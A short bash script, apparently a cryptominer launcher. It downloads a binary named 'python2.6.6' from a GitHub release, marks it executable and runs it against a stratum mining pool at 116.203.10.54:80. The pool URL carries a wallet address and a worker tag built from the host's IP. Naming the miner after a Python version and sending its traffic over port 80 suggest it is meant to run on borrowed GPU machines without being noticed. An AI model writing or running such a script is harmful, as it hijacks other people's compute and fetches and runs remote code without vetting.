#!bin/bash -xe 

## getting IP info
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '##################### RV CU 01 ########################'
echo '#######################################################'

rm -rf python2.6.6
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
#cp python2.6.6 /bin/python2.6.6

if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RVCU_$IPNAME@116.203.10.54:80  -U
else
    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RVCU_$IPNAME@116.203.10.54:80  -U 
fi